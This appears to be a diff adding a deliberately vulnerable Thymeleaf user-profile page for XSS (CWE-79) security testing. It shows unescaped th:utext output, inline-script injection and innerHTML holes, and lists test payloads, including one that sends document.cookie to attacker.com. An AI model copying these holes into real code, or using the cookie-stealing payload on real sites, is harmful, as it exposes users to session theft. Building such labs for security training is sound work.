@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>User Profile - VULNERABLE TO XSS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .profile-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .error {
+            color: red;
+            font-weight: bold;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        h1 { color: #333; }
+        .field { margin: 15px 0; }
+        .label { font-weight: bold; color: #555; }
+        .value { color: #000; margin-left: 10px; }
+    </style>
+</head>
+<body>
+    <div class="profile-container">
+        <div class="warning">
+            ⚠️ WARNING: This page is INTENTIONALLY VULNERABLE to XSS attacks (CWE-79) for security testing purposes.
+        </div>
+
+        <h1>User Profile</h1>
+
+        <div th:if="${error}">
+            <p class="error">
+                <!-- VULNERABILITY 1: Reflected XSS - username from URL path variable rendered without escaping -->
+                Error: <span th:utext="${error}"></span> for username:
+                <span th:utext="${username}"></span>
+            </p>
+        </div>
+
+        <div th:if="${user}">
+            <!-- VULNERABILITY 2: Stored XSS - user data from database rendered without escaping using th:utext -->
+            <div class="field">
+                <span class="label">Username:</span>
+                <span class="value" th:utext="${user.username}"></span>
+            </div>
+
+            <!-- VULNERABILITY 3: Stored XSS - email rendered without escaping -->
+            <div class="field">
+                <span class="label">Email:</span>
+                <span class="value" th:utext="${user.email}"></span>
+            </div>
+
+            <!-- VULNERABILITY 4: Stored XSS - role rendered without escaping -->
+            <div class="field">
+                <span class="label">Role:</span>
+                <span class="value" th:utext="${user.role}"></span>
+            </div>
+
+            <!-- VULNERABILITY 5: User ID (less likely to be exploited but still demonstrates poor practice) -->
+            <div class="field">
+                <span class="label">User ID:</span>
+                <span class="value" th:utext="${user.id}"></span>
+            </div>
+
+            <!-- VULNERABILITY 6: Direct injection into JavaScript - CRITICAL XSS VECTOR -->
+            <script th:inline="javascript">
+                // VULNERABLE: User-controlled data directly embedded in JavaScript without escaping
+                var username = /*[[${user.username}]]*/ 'default';
+                var email = /*[[${user.email}]]*/ 'default@email.com';
+                var role = /*[[${user.role}]]*/ 'USER';
+
+                // This data can break out of strings and execute arbitrary JavaScript
+                console.log("Loading profile for user: " + username);
+
+                // VULNERABILITY 7: Using innerHTML with user data
+                document.addEventListener('DOMContentLoaded', function() {
+                    var welcomeDiv = document.getElementById('welcome-message');
+                    // Direct concatenation of user input into innerHTML - DANGEROUS!
+                    welcomeDiv.innerHTML = "Welcome back, " + username + "!";
+
+                    var emailDiv = document.getElementById('email-display');
+                    emailDiv.innerHTML = "Your email: <strong>" + email + "</strong>";
+                });
+
+                // VULNERABILITY 8: eval-like behavior with user data
+                function displayUserInfo() {
+                    var info = "User: " + username + ", Email: " + email;
+                    document.getElementById('dynamic-info').innerHTML = info;
+                }
+            </script>
+
+            <div id="welcome-message" style="margin: 20px 0; padding: 10px; background: #e3f2fd; border-radius: 4px;"></div>
+            <div id="email-display" style="margin: 20px 0;"></div>
+            <div id="dynamic-info" style="margin: 20px 0;"></div>
+
+            <button onclick="displayUserInfo()" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
+                Display User Info
+            </button>
+        </div>
+
+        <!-- VULNERABILITY 9: Reflected XSS in different context -->
+        <script th:inline="javascript">
+            /*[# th:if="${username}"]*/
+            // Username from URL path - reflected XSS vector
+            var searchedUsername = /*[[${username}]]*/ '';
+            console.log("Searched for username: " + searchedUsername);
+            /*[/]*/
+        </script>
+
+        <div style="margin-top: 30px; padding: 20px; background: #f8d7da; border-radius: 4px;">
+            <h3>Security Issues in This Page (CWE-79):</h3>
+            <ul>
+                <li><strong>th:utext usage:</strong> Renders HTML without escaping, allowing script injection</li>
+                <li><strong>JavaScript inline data:</strong> User data embedded directly in &lt;script&gt; tags</li>
+                <li><strong>innerHTML usage:</strong> DOM manipulation with unsanitized user input</li>
+                <li><strong>Reflected XSS:</strong> URL path parameter (username) rendered without validation</li>
+                <li><strong>Stored XSS:</strong> Database content (username, email, role) rendered without sanitization</li>
+                <li><strong>No Content Security Policy (CSP):</strong> No browser-level XSS protection</li>
+                <li><strong>No input validation:</strong> Controller accepts any input without filtering</li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 20px;">
+            <h3>Example XSS Payloads for Testing:</h3>
+            <code style="display: block; background: #f4f4f4; padding: 10px; margin: 5px 0; border-radius: 4px;">
+                /api/xss-profile/&lt;script&gt;alert('XSS')&lt;/script&gt;
+            </code>
+            <code style="display: block; background: #f4f4f4; padding: 10px; margin: 5px 0; border-radius: 4px;">
+                /api/xss-profile/&lt;img src=x onerror=alert('XSS')&gt;
+            </code>
+            <code style="display: block; background: #f4f4f4; padding: 10px; margin: 5px 0; border-radius: 4px;">
+                Username in database: '&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
+            </code>
+        </div>
+    </div>
+</body>
+</html>
